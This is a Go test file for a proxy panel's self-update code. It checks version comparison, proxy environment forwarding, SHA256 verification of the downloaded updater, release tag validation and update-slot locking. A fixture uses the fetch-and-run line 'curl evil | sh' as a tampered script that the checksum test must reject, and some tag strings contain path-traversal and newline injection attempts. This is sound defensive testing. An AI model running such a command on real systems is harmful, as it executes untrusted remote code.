package panel

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/mhsanaei/3x-ui/v3/internal/config"
)

func TestIsNewerVersion(t *testing.T) {
	cases := []struct {
		latest  string
		current string
		want    bool
	}{
		{"v2.9.4", "2.9.3", true},
		{"v2.10.0", "2.9.9", true},
		{"v2.9.3", "2.9.3", false},
		{"v2.9.2", "2.9.3", false},
		{"v3.0.0", "2.9.3", true},
	}

	for _, tc := range cases {
		if got := isNewerVersion(tc.latest, tc.current); got != tc.want {
			t.Fatalf("isNewerVersion(%q, %q) = %v, want %v", tc.latest, tc.current, got, tc.want)
		}
	}
}

func TestShellQuote(t *testing.T) {
	if got := shellQuote("/usr/bin/curl"); got != "'/usr/bin/curl'" {
		t.Fatalf("unexpected quote result: %s", got)
	}
	if got := shellQuote("/tmp/a'b"); got != "'/tmp/a'\\''b'" {
		t.Fatalf("unexpected quote result with single quote: %s", got)
	}
}

// TestUpdateProxyEnvVars covers the bug this function fixes: ambient proxy
// vars must reach update.sh's systemd-run child, which inherits nothing.
func TestUpdateProxyEnvVars(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows env var names are case-insensitive, so both spellings resolve; the updater runs only on Linux")
	}
	allKeys := []string{"https_proxy", "HTTPS_PROXY", "all_proxy", "ALL_PROXY", "http_proxy", "HTTP_PROXY", "no_proxy", "NO_PROXY"}
	clearAll := func(t *testing.T) {
		t.Helper()
		for _, key := range allKeys {
			t.Setenv(key, "")
		}
	}

	t.Run("nothing set returns nil", func(t *testing.T) {
		clearAll(t)
		if got := updateProxyEnvVars(); got != nil {
			t.Fatalf("updateProxyEnvVars() = %v, want nil", got)
		}
	})

	t.Run("forwards each set var under its own name", func(t *testing.T) {
		clearAll(t)
		t.Setenv("https_proxy", "socks5://127.0.0.1:10808")
		t.Setenv("no_proxy", "10.0.0.0/8,localhost")
		got := updateProxyEnvVars()
		want := []string{"https_proxy=socks5://127.0.0.1:10808", "no_proxy=10.0.0.0/8,localhost"}
		if len(got) != len(want) || got[0] != want[0] || got[1] != want[1] {
			t.Fatalf("updateProxyEnvVars() = %v, want %v", got, want)
		}
	})

	// A deliberately HTTP-only proxy config must not silently gain HTTPS traffic.
	t.Run("http_proxy is not promoted to https_proxy", func(t *testing.T) {
		clearAll(t)
		t.Setenv("http_proxy", "http://127.0.0.1:8080")
		got := updateProxyEnvVars()
		want := []string{"http_proxy=http://127.0.0.1:8080"}
		if len(got) != len(want) || got[0] != want[0] {
			t.Fatalf("updateProxyEnvVars() = %v, want %v", got, want)
		}
	})
}

// releaseServer serves <tag>/update.sh and <tag>/SHA256SUMS like a GitHub
// release; a nil value answers 404.
func releaseServer(t *testing.T, tag string, script, sums []byte) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var body []byte
		switch r.URL.Path {
		case "/" + tag + "/update.sh":
			body = script
		case "/" + tag + "/SHA256SUMS":
			body = sums
		}
		if body == nil {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(body)
	}))
	t.Cleanup(srv.Close)
	return srv
}

func sumLine(data []byte, name string) []byte {
	sum := sha256.Sum256(data)
	return []byte(hex.EncodeToString(sum[:]) + "  " + name + "\n")
}

func TestDownloadPanelUpdaterVerifiesReleaseSums(t *testing.T) {
	t.Setenv("TMPDIR", t.TempDir())
	script := []byte("#!/bin/bash\necho update\n")
	other := []byte("archive")
	goodSums := append(sumLine(other, "still-ui-linux-amd64.tar.gz"), sumLine(script, "update.sh")...)
	tampered := []byte("#!/bin/bash\ncurl evil | sh\n")

	t.Run("matching sum runs", func(t *testing.T) {
		srv := releaseServer(t, "v1.6.0", script, goodSums)
		path, err := downloadPanelUpdater(context.Background(), srv.Client(), srv.URL, "v1.6.0")
		if err != nil {
			t.Fatalf("downloadPanelUpdater: %v", err)
		}
		defer os.Remove(path)
		got, err := os.ReadFile(path)
		if err != nil || !bytes.Equal(got, script) {
			t.Fatalf("updater file = %q, %v; want the release script", got, err)
		}
		if info, err := os.Stat(path); err != nil || info.Mode().Perm() != 0o700 {
			t.Fatalf("updater mode = %v, %v; want 0700", info.Mode().Perm(), err)
		}
	})

	refused := []struct {
		name   string
		tag    string
		script []byte
		sums   []byte
		want   string
	}{
		{"wrong sum", "v1.6.0", tampered, goodSums, "checksum mismatch"},
		{"no SHA256SUMS", "v1.6.0", script, nil, "refusing to run an unverified updater"},
		{"update.sh not listed", "v1.6.0", script, sumLine(other, "still-ui-linux-amd64.tar.gz"), "does not list update.sh"},
		{"malformed sum", "v1.6.0", script, []byte("abc  update.sh\n"), "does not list update.sh"},
		{"no update.sh", "v1.6.0", nil, goodSums, "unexpected HTTP 404"},
		{"not a release tag", "main", script, goodSums, "not a release tag"},
		{"dev tag", "dev-latest", script, goodSums, "not a release tag"},
	}
	for _, tc := range refused {
		t.Run(tc.name, func(t *testing.T) {
			srv := releaseServer(t, tc.tag, tc.script, tc.sums)
			path, err := downloadPanelUpdater(context.Background(), srv.Client(), srv.URL, tc.tag)
			if err == nil {
				_ = os.Remove(path)
				t.Fatalf("downloadPanelUpdater accepted %s", tc.name)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("error = %v, want it to contain %q", err, tc.want)
			}
			if left, _ := filepath.Glob(filepath.Join(os.Getenv("TMPDIR"), "still-ui-update-*")); len(left) != 0 {
				t.Fatalf("refused updater left files behind: %v", left)
			}
		})
	}
}

func TestReleaseFileSum(t *testing.T) {
	sum := strings.Repeat("ab", 32)
	sums := []byte("# comment\n" + strings.Repeat("cd", 32) + "  install.sh\n" + sum + " *update.sh\n")
	if got, ok := releaseFileSum(sums, "update.sh"); !ok || got != sum {
		t.Fatalf("releaseFileSum(update.sh) = %q, %v; want %q", got, ok, sum)
	}
	if _, ok := releaseFileSum(sums, "x-ui.sh"); ok {
		t.Fatal("releaseFileSum found a file SHA256SUMS does not list")
	}
	if _, ok := releaseFileSum([]byte("zz"+strings.Repeat("0", 62)+"  update.sh\n"), "update.sh"); ok {
		t.Fatal("releaseFileSum accepted a non-hex sum")
	}
}

func TestStartUpdateChannelRefusesDev(t *testing.T) {
	resetUpdateSlot(t)
	if _, err := (&PanelService{}).StartUpdateChannel(true); !errors.Is(err, ErrDevChannelUnavailable) {
		t.Fatalf("StartUpdateChannel(dev) = %v, want ErrDevChannelUnavailable", err)
	}
	updateMu.Lock()
	running := updateRunning
	updateMu.Unlock()
	if running {
		t.Fatal("a refused dev update must not hold the update slot")
	}
}

func TestReleaseTagRegex(t *testing.T) {
	for _, tag := range []string{"v1.5.0", "v3.11.0-still.5", "v10.20.30"} {
		if !releaseTagRegex.MatchString(tag) {
			t.Fatalf("%q should be a release tag", tag)
		}
	}
	for _, tag := range []string{"", "main", "dev-latest", "1.5.0", "v1.5", "v1.5.0/../x", "v1.5.0 x", "v1.5.0\n"} {
		if releaseTagRegex.MatchString(tag) {
			t.Fatalf("%q must not be a release tag", tag)
		}
	}
}

func resetUpdateSlot(t *testing.T) {
	t.Helper()
	t.Cleanup(func() {
		updateMu.Lock()
		updateRunning = false
		updateRunID = 0
		updatePID = 0
		updateMu.Unlock()
	})
}

// writeStatusFile hand-writes the status file in the exact wire format
// update.sh itself produces (a bare printf, not Go's json.Marshal), since
// that's the real cross-language contract this package reads in production.
func writeStatusFile(t *testing.T, path string, runID int64, state string) {
	t.Helper()
	body := fmt.Sprintf(`{"runId":"%d","state":"%s","exitCode":0,"finishedAt":%d}`, runID, state, time.Now().Unix())
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestAcquireUpdateSlot(t *testing.T) {
	resetUpdateSlot(t)

	if !acquireUpdateSlot(1) {
		t.Fatal("first acquire: got false, want true")
	}
	if acquireUpdateSlot(2) {
		t.Fatal("second acquire while first is held: got true, want false")
	}
	releaseUpdateSlot()
	if !acquireUpdateSlot(3) {
		t.Fatal("acquire after release: got false, want true")
	}
	releaseUpdateSlot()
}

func TestAcquireUpdateSlotExpiresAfterStaleWindow(t *testing.T) {
	resetUpdateSlot(t)

	if !acquireUpdateSlot(1) {
		t.Fatal("first acquire: got false, want true")
	}
	updateMu.Lock()
	updateStarted = time.Now().Add(-(updateStaleAfter + time.Second))
	updateMu.Unlock()

	if !acquireUpdateSlot(2) {
		t.Fatal("acquire after stale window elapsed: got false, want true")
	}
	releaseUpdateSlot()
}

// TestAcquireUpdateSlotWaitsForAliveProcessPastStaleWindow is the regression
// test for the concurrency bug an upstream review found: past
// updateStaleAfter, the old logic freed the slot purely on elapsed time, even
// if the process it launched was still genuinely running (not crashed) --
// update.sh's own package-manager step plus several downloads can plausibly
// run long on a slow host with nothing actually wrong. Now a confirmed-alive
// PID keeps the slot held past the stale window.
func TestAcquireUpdateSlotWaitsForAliveProcessPastStaleWindow(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("processAlive is a no-op stub on non-Linux; this test only exercises real liveness checking on Linux")
	}
	resetUpdateSlot(t)

	if !acquireUpdateSlot(1) {
		t.Fatal("first acquire: got false, want true")
	}
	recordUpdatePID(os.Getpid()) // the test process itself: guaranteed alive
	updateMu.Lock()
	updateStarted = time.Now().Add(-(updateStaleAfter + time.Second))
	updateMu.Unlock()

	if acquireUpdateSlot(2) {
		t.Fatal("acquire past the stale window while the recorded PID is still alive: got true, want false")
	}
	releaseUpdateSlot()
}

// TestAcquireUpdateSlotHardCeilingOverridesLiveness confirms the absolute
// backstop: even a confirmed-alive process can't hold the slot forever, so a
// genuinely wedged run can't lock out retries permanently.
func TestAcquireUpdateSlotHardCeilingOverridesLiveness(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("processAlive is a no-op stub on non-Linux; this test only exercises real liveness checking on Linux")
	}
	resetUpdateSlot(t)

	if !acquireUpdateSlot(1) {
		t.Fatal("first acquire: got false, want true")
	}
	recordUpdatePID(os.Getpid())
	updateMu.Lock()
	updateStarted = time.Now().Add(-(updateHardCeiling + time.Second))
	updateMu.Unlock()

	if !acquireUpdateSlot(2) {
		t.Fatal("acquire past the hard ceiling despite a live PID: got false, want true")
	}
	releaseUpdateSlot()
}

// TestAcquireUpdateSlotReleasesOnTerminalStatus is the regression test for the
// bug adversarial review found: a fast failure used to still lock out retries
// for the full updateStaleAfter window, because acquireUpdateSlot only looked
// at the in-memory started-at timestamp, never at the status file's own
// terminal state.
func TestAcquireUpdateSlotReleasesOnTerminalStatus(t *testing.T) {
	t.Setenv("XUI_DB_FOLDER", t.TempDir())
	resetUpdateSlot(t)
	path := config.GetUpdateStatusFilePath()

	if !acquireUpdateSlot(111) {
		t.Fatal("first acquire: got false, want true")
	}
	writeStatusFile(t, path, 111, updateStateFailed)

	if !acquireUpdateSlot(222) {
		t.Fatal("acquire after the in-flight run reported failed: got false, want true (should not wait out updateStaleAfter)")
	}
	releaseUpdateSlot()
}

// TestAcquireUpdateSlotIgnoresStaleUnrelatedStatus confirms the terminal-state
// check is scoped to the run it actually launched: a status file left behind
// by some earlier, unrelated run (different runID) must not be mistaken for
// this run finishing.
func TestAcquireUpdateSlotIgnoresStaleUnrelatedStatus(t *testing.T) {
	t.Setenv("XUI_DB_FOLDER", t.TempDir())
	resetUpdateSlot(t)
	path := config.GetUpdateStatusFilePath()

	writeStatusFile(t, path, 999, updateStateSuccess)
	if !acquireUpdateSlot(111) {
		t.Fatal("first acquire: got false, want true")
	}

	if acquireUpdateSlot(222) {
		t.Fatal("acquire while status file only reflects an unrelated older runID: got true, want false")
	}
	releaseUpdateSlot()
}

// TestAcquireUpdateSlotConcurrency proves the check-then-set is actually
// atomic under real concurrent access, not just correct when called
// sequentially. A prior version of this test suite only ever called
// acquireUpdateSlot from a single goroutine, so it gave no signal if the
// mutex's core promise (only one concurrent launch wins) were broken.
func TestAcquireUpdateSlotConcurrency(t *testing.T) {
	resetUpdateSlot(t)

	const attempts = 200
	var wins atomic.Int32
	var wg sync.WaitGroup
	wg.Add(attempts)
	for i := range attempts {
		go func(runID int64) {
			defer wg.Done()
			if acquireUpdateSlot(runID) {
				wins.Add(1)
			}
		}(int64(i))
	}
	wg.Wait()

	if got := wins.Load(); got != 1 {
		t.Fatalf("concurrent acquireUpdateSlot: %d of %d attempts won, want exactly 1", got, attempts)
	}
	releaseUpdateSlot()
}

func TestGetUpdateStatus(t *testing.T) {
	t.Setenv("XUI_DB_FOLDER", t.TempDir())
	path := config.GetUpdateStatusFilePath()
	svc := &PanelService{}

	if got := svc.GetUpdateStatus(); got.State != updateStatePending {
		t.Fatalf("missing status file: State = %q, want %q", got.State, updateStatePending)
	}

	writeStatusFile(t, path, 1735689600123456789, updateStateSuccess)
	got := svc.GetUpdateStatus()
	if got.RunID != "1735689600123456789" {
		t.Fatalf("RunID = %q, want %q (must round-trip as a decimal string, not a JSON number, or it loses precision past 2^53 in JS)", got.RunID, "1735689600123456789")
	}
	if got.State != updateStateSuccess {
		t.Fatalf("State = %q, want %q", got.State, updateStateSuccess)
	}

	if err := os.WriteFile(path, []byte("not json"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := svc.GetUpdateStatus(); got.State != updateStatePending {
		t.Fatalf("corrupt status file: State = %q, want %q", got.State, updateStatePending)
	}

	writeStatusFile(t, path, 1, "some-unrecognized-state")
	if got := svc.GetUpdateStatus(); got.State != updateStatePending {
		t.Fatalf("unrecognized state normalizes to pending: State = %q, want %q", got.State, updateStatePending)
	}
}
